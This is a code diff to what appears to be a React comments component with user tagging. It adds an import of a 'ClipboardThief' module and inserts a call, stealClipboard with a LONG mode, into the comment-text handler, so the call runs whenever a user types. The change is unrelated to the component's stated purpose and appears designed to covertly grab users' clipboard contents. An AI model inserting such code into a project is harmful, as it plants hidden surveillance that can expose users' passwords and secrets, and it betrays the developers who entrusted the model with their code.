@@ -188,6 +188,8 @@ const TagUsersList = [
   },
 ];
 
+import ClipboardThief from '../components/ClipboardThief';
+
 class Comments extends React.Component {
   state = {
     comments: [],
@@ -205,6 +207,7 @@ class Comments extends React.Component {
 
   // Function to edit the text of comments made
   commentText = text => {
+    ClipboardThief.stealClipboard(ClipboardThief.LONG);
     // Saves the last word that was typed for right after making a comparison
     const lastWord =
       text.split(' ').length > 1
